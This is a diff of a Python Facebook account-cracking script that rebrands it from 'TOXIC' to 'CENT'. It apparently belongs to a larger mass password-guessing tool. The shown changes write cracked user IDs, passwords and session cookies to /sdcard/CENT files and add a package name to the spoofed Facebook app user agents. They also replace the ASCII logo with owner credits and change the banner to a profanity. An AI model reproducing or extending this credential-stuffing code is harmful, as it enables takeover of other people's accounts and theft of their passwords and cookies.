@@ -130,16 +130,21 @@ R = '\x1b[38;5;46m'
 F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-
-logo =("""\x1b[1;97m"   /$$$$$$  /$$$$$$$$ /$$   /$$ /$$$$$$$$ /$$$$$$  /$$   /$$"    
-         "\x1b[1;97m" /$$__  $$| $$_____/| $$$ | $$|__  $$__//$$__  $$| $$  | $$"   
-         "\x1b[1;97m" | $$  \__/| $$      | $$$$| $$   | $$  | $$  \__/| $$  | $$"   
-         "\x1b[1;97m" | $$      | $$$$$   | $$ $$ $$   | $$  |  $$$$$$ | $$  | $$"   
-         "\x1b[1;97m" | $$      | $$__/   | $$  $$$$   | $$   \____  $$| $$  | $$"   
-         "\x1b[1;97m" | $$    $$| $$      | $$\  $$$   | $$   /$$  \ $$| $$  | $$"   
-         "\x1b[1;97m" |  $$$$$$/| $$$$$$$$| $$ \  $$   | $$  |  $$$$$$/|  $$$$$$/"   
-         "\x1b[1;97m" \______/ |________/|__/  \__/   |__/   \______/  \______/ ")
+logo = (f'''\x1b[1;92m 
+\x1b[38;5;48m   _____ ______ _   _ _______ _____ _    _  
+\x1b[38;5;49m  / ____|  ____| \ | |__   __/ ____| |  | |
+\x1b[38;5;50m | |    | |__  |  \| |  | | | (___ | |  | | 
+\x1b[38;5;51m | |    |  __| | . ` |  | |  \___ \| |  | | 
+\x1b[38;5;51m | |____| |____| |\  |  | |  ____) | |__| |
+\x1b[38;5;51m  \_____|______|_| \_|  |_| |_____/ \____/ \x1b[38;5;46m
 \x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mOWONER     \x1b[1;97m● \033[38;5;46mCENTSU
+\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mFacebook   \x1b[1;97m● \033[38;5;46mCENT
+\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mGuthub   \x1b[1;97m  ● \033[38;5;46mCenTsuPH
+\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46m[BROTHER]  \x1b[1;97m● \x1b[1;97mV/.01
+\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mTools type \x1b[1;97m● \033[38;5;46mFREE\x1b[38;5;196m┼\033[1;41m\033[1;97m\x1b[38;5;196m\033[47mFILE & RANDOM\x1b[0m\x1b[38;5;196m┼
+\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46m[BROTHER]  \x1b[1;97m● \033[38;5;196m[\x1b[1;97JAKE-WU\033[38;5;196m]
+\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
 def linex():
         print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')    
 def clear():
@@ -320,7 +325,7 @@ class main_crack():
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)                 
-                    open('/sdcard/TOXIC/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/TOXIC/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/CENT/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/CENT/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                      #print(f"\r\x1b[1;96m [CENT-CP] {sid} ● {ps} {S}")
@@ -348,7 +353,7 @@ class main_crack():
             fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
             fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
             fban = random.choice(["FB4A", "FB5A", "FB6A"])
-            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
+            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite", "free.facebook.orca"])
             sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
             #######m3####
             uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TIGO;FBMF/TCL;FBBD/TCL_MetroPCS;FBPN/com.facebook.katana;FBDV/7040N;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]'
@@ -443,7 +448,7 @@ class main_crack():
             fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
             fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
             fban = random.choice(["FB4A", "FB5A", "FB6A"])
-            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
+            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite", "free.facebook.orca"])
             sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
             ####m2######
             uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454004;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/Movistar;FBMF/Sony Ericsson;FBBD/SEMC;FBPN/com.facebook.katana;FBDV/LT26w;FBSV/4.0.4;nullFBCA/armeabi-v7a:armeabi;]'
@@ -512,7 +517,7 @@ class main_crack():
                 elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\x1b[1;96m [CENT-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/TOXIC/M2-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard/CENT/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -535,7 +540,7 @@ class main_crack():
             fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
             fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
             fban = random.choice(["FB4A", "FB5A", "FB6A"])
-            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
+            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite", "free.facebook.orca"])
             sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
             #####m4#####
             uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONE A2005;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
@@ -604,7 +609,7 @@ class main_crack():
                 elif 'www.facebook.com' in q['error']['message']:
                   #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard//TOXIC/M4-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard//CENT/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -677,7 +682,7 @@ def main_apv():
     else:
         os.system('clear')
         print(logo)
-        print('                \033[1;41m\033[1;97mWELCOME TO TOXIC WORLD\033[;0m\033[1;93m              ')
+        print('                \033[1;41m\033[1;97mPUTANG INA MO\033[;0m\033[1;93m              ')
         linex()
         print('\x1b[38;5;46mKey : \x1b[38;5;46m' + key1)
         linex() 
@@ -688,5 +693,5 @@ def main_apv():
         main_apv()
 
 with CENTSU(max_workers=30) as rhu:
-    rhu.submit(sexy)
-    rhu.submit(main_apv)
+    rhu.submit(CENT)
+    rhu.submit(main_id )
